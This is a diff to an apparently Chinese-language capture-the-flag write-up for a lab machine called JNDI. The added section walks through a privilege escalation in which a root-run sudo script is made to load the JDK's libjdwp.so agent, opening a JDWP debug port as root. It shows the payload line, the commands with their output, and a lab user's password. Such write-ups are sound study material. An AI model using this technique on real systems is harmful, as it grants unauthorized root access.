@@ -121,7 +121,7 @@ ldap://192.168.56.130:1389/a
 得到shell,拿到flag{ilikeyou,Nozomi}
 ![image.png](https://gitee.com/fogpost/photo/raw/master/202603272158717.png)
 
-## 提权
+## 错误提权
 查看/opt
 ```
 /opt
@@ -279,3 +279,40 @@ find / -perm -4000 -type f 2>/dev/null
 ![image.png](https://gitee.com/fogpost/photo/raw/master/202603291657905.png)
 没搞好吧图片删掉了借下Xiaohao的图片
 测试liz的密码是sanmuximei
+
+再liz账户下sudo -l发现/opt/java_agent_start.sh，且之前知道/tmp/opt用户可写
+```bash
+liz@JNDI:~$ sudo -l
+[sudo] password for liz: 
+Matching Defaults entries for liz on JNDI:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User liz may run the following commands on JNDI:
+    (ALL) /bin/bash /opt/java_agent_start.sh
+```
+
+```java
+file_name=/opt/file/tmp
+
+file_line=$(awk 'NR==1 {print;exit}' "$file_name")
+file_line=$(basename $file_line)
+
+cd /opt
+
+echo $file_line
+
+/usr/local/java/.../bin/java -agentpath:/usr/local/java/.../$file_line test
+```
+有root权限执⾏脚本，对tmp⽂件可控，但是basename限制了路径穿越同时发现传参之后包含潜在的引号也堵死了命令注⼊
+
+在 Java 的标准库⽬录下，存放着很多官⽅的 Agent 库，其中最著名的就是 libjdwp.so 。
+
+JDWP (Java Debug Wire Protocol) 是 Java 提供的调试协议。如果我们在加载它时传⼊特定的参数，它就会在指定的端⼝上开启⼀个调试服务。⽽在 Java 中，调试器拥有最⾼权限：它可以随意实例化对象、调⽤⽅法（包括 Runtime.getRuntime().exec() 来执⾏系统命令）。
+
+```bash
+liz@JNDI:/home/bluebird$ echo "libjdwp.so=transport=dt_socket,server=y,address=8000,suspend=y" >/opt/file/tmp
+liz@JNDI:/home/bluebird$ sudo /bin/bash /opt/java_agent_start.sh
+libjdwp.so=transport=dt_socket,server=y,address=8000,suspend=y
+Listening for transport dt_socket at address: 8000
+```
